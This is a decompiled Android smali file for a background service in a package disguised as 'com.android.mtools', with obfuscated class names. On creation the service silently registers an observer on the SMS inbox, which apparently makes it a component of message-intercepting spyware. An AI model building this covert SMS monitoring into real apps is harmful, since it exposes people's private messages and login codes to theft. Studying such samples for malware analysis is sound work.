.class public Lcom/android/mtools/MPService;
.super Landroid/app/Service;


# instance fields
.field private X:Landroid/content/Context;

.field private aQ:Lcom/android/mtools/N;

.field private aR:Lcom/android/mtools/O;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 5

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Lcom/android/mtools/MPService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/android/mtools/MPService;->X:Landroid/content/Context;

    new-instance v0, Lcom/android/mtools/N;

    invoke-direct {v0}, Lcom/android/mtools/N;-><init>()V

    iput-object v0, p0, Lcom/android/mtools/MPService;->aQ:Lcom/android/mtools/N;

    iget-object v0, p0, Lcom/android/mtools/MPService;->aQ:Lcom/android/mtools/N;

    invoke-virtual {p0}, Lcom/android/mtools/MPService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    iget-object v2, p0, Lcom/android/mtools/MPService;->X:Landroid/content/Context;

    invoke-static {}, Lcom/android/mtools/P;->V()V

    new-instance v3, Lcom/android/mtools/O;

    new-instance v4, Landroid/os/Handler;

    invoke-direct {v4}, Landroid/os/Handler;-><init>()V

    invoke-direct {v3, v0, v2, v4}, Lcom/android/mtools/O;-><init>(Lcom/android/mtools/N;Landroid/content/Context;Landroid/os/Handler;)V

    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v1, v0, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    iput-object v3, p0, Lcom/android/mtools/MPService;->aR:Lcom/android/mtools/O;

    return-void
.end method

.method public onDestroy()V
    .locals 2

    iget-object v0, p0, Lcom/android/mtools/MPService;->aQ:Lcom/android/mtools/N;

    invoke-virtual {p0}, Lcom/android/mtools/MPService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lcom/android/mtools/MPService;->aR:Lcom/android/mtools/O;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    invoke-static {}, Lcom/android/mtools/P;->V()V

    if-eqz p1, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "action="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    invoke-static {}, Lcom/android/mtools/P;->V()V

    iget-object v0, p0, Lcom/android/mtools/MPService;->X:Landroid/content/Context;

    invoke-static {v0}, Lcom/android/mtools/q;->d(Landroid/content/Context;)Lcom/android/mtools/q;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/android/mtools/q;->a(Landroid/content/Intent;)V

    :cond_0
    const/4 v0, 0x2

    return v0
.end method
